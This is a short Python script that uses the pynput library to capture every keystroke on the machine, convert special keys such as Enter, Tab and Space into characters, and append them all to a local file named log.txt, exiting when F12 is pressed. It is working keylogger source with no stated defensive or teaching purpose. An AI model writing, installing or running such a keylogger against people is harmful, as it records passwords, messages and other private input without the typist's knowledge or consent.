from pynput.keyboard import Listener
#Create define anonymous to get key and filter
def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.enter" or key == "Key.tab" or key == "Key.ctrl_l" or key == "Key.alt_l":
        key = "\n"
    if key == "Key.space":
        key = "\t"
    if key == "Key.backspace":
        key = "\b"
    with open("log.txt","a") as file:
        file.write(key)
    print(key)
with Listener(on_press=anonymous) as listener:
    listener.join()

        